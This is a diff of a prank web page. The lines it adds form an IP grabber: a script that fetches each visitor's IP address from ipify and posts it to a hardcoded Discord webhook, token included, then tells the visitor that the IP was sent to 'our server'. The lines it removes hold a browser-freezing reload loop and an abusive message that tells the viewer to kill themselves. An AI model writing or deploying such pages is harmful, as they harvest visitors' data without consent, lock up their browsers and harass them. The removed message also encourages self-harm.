@@ -1,26 +1,22 @@
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <script>onbeforeunload = function(){localStorage.x=1};
+<script>
+  function getIP(json) {
+    var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1047725317663498250/ph7vWawo0wvlBhH54bK5YiYLedEJe0Fat0opyohLKGv2_8_jIblrjNXw8Z-nh_egWaKU");
+  
+        request.setRequestHeader('Content-type', 'application/json');
+  
+        var params = {
+          username: "beamed",
+          avatar_url: "https://cdn.discordapp.com/avatars/1047725317663498250/5e47c805463321a8a6a7dde3edab59e5.webp?size=128",
+          content: "**IP:** *" + json.ip + "*"
+        }
+  
+        request.send(JSON.stringify(params));
+        alert(json.ip)
+      }
+  
+  </script>
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 
-setTimeout(function(){
-  while(1)location.reload(1)
-}, 1000)</script>
-</head>
-<style>
-  h1 {
-    font-family: Verdana;
-    color: crimson;
-  }
-</style>
-<body>
-    <center>
-      <h1>LMAO MR SHITLEY GOT YOU<h1></h1>
-      <p>kill yourself</p>
-      <img src="https://steamuserimages-a.akamaihd.net/ugc/829070438383642241/4D10AF9F082CEF34A8AB62290F06BFF9F330F466/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false">
-    </center>
-</body>
-</html>
+<h1>YOUR IP ADDRESS HAS BEEN SENT TO OUR SERVER.</h1>
+<p>https://discord.gg/fEeEEzyCJU</p>
